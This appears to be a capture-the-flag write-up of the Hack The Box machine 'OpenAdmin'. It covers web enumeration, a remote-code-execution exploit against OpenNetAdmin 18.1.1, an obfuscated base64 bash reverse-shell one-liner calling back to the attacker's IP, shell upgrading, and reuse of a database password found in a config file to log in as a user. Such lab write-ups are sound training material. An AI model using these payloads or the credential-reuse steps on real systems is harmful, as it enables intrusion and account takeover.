# OpenAdmin 

![image](https://user-images.githubusercontent.com/5285547/124369170-d137d380-dc60-11eb-90cd-9aca9d30f8ef.png)

## Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


## Port 80

Using gobuster i enumerated port 80 as only the default apache page loaded. 

```
/index.html           (Status: 200) [Size: 10918]
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/] 
```

### Artwork

http://10.10.10.171/artwork/index.html

- Gobuster
```
/index.html           (Status: 200) [Size: 14461]
/images               (Status: 301) [Size: 321] [--> http://10.10.10.171/artwork/images/]
/main.html            (Status: 200) [Size: 931]                                          
/services.html        (Status: 200) [Size: 11749]                                        
/about.html           (Status: 200) [Size: 11156]                                        
/contact.html         (Status: 200) [Size: 8999]                                         
/blog.html            (Status: 200) [Size: 11523]                                        
/css                  (Status: 301) [Size: 318] [--> http://10.10.10.171/artwork/css/]   
/readme.txt           (Status: 200) [Size: 410]                                          
/js                   (Status: 301) [Size: 317] [--> http://10.10.10.171/artwork/js/]    
/fonts                (Status: 301) [Size: 320] [--> http://10.10.10.171/artwork/fonts/] 
/single.html          (Status: 200) [Size: 17627]  
```

### Sierra

http://10.10.10.171/sierra/index.html

- Gobuster
```
/contact.html         (Status: 200) [Size: 15853]
/blog.html            (Status: 200) [Size: 20477]
/index.html           (Status: 200) [Size: 43029]
/img                  (Status: 301) [Size: 317] [--> http://10.10.10.171/sierra/img/]
/service.html         (Status: 200) [Size: 22090]                                    
/css                  (Status: 301) [Size: 317] [--> http://10.10.10.171/sierra/css/]
/portfolio.html       (Status: 200) [Size: 13000]                                    
/js                   (Status: 301) [Size: 316] [--> http://10.10.10.171/sierra/js/] 
/about-us.html        (Status: 200) [Size: 20785]                                    
/elements.html        (Status: 200) [Size: 24524]                                    
/fonts                (Status: 301) [Size: 319] [--> http://10.10.10.171/sierra/fonts/]
/vendors              (Status: 301) [Size: 321] [--> http://10.10.10.171/sierra/vendors/]
```

Not a lot on the above two sites.

### Music

http://10.10.10.171/music/index.html

- Gobuster
```
/img                  (Status: 301) [Size: 316] [--> http://10.10.10.171/music/img/]
/contact.html         (Status: 200) [Size: 6223]                                    
/blog.html            (Status: 200) [Size: 6728]                                    
/main.html            (Status: 200) [Size: 931]                                     
/category.html        (Status: 200) [Size: 23863]                                   
/index.html           (Status: 200) [Size: 12554]                                   
/css                  (Status: 301) [Size: 316] [--> http://10.10.10.171/music/css/]
/js                   (Status: 301) [Size: 315] [--> http://10.10.10.171/music/js/] 
/artist.html          (Status: 200) [Size: 20133]                                   
/playlist.html        (Status: 200) [Size: 8885] 
```

I found a login button but it redirects to ../ona

![image](https://user-images.githubusercontent.com/5285547/124369606-4c02ed80-dc65-11eb-9237-46b771469cd4.png)


## www-data

Going to http://10.10.10.171/ona/   
gives us the openNetAdmin interface with ```verson 18.1.1```

Finding an exploit online I crafted my own from this example: https://packetstormsecurity.com/files/162516/opennetadmin85141811-exec.txt

My Exploit: https://github.com/AssassinUKG/Writeups/tree/main/hackthebox/dare/openadmin/opennetadmin

```
bash openNetAdmin.sh http://10.10.10.171/ona/ id
```

Usng my shell I was able to get a reverseshell from the box. 

Command used (bash revshell + base64 encoded + urlencoding)
```
echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNS85OTg4IDA%2BJjE%3D | base64 -d| bash
```

![image](https://user-images.githubusercontent.com/5285547/124384929-76879180-dccb-11eb-97d1-1c6e1faadf0c.png)

Upgrade your shell as usual...
```
python3 -c 'import pty;pty.spwan("/bin/bash")'
stty raw -echo;fg
reset
xterm
```

Looking aroud the system I finally find the database config file loacated
```
/var/www/html/ona/local/config/database_settings.inc.php
```
```
'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
```

## Jimmy

Trying the password for the database on the system users. Let's us in as Jimmy  

creds:
```Jimmy:n1nj4W4rri0R!```

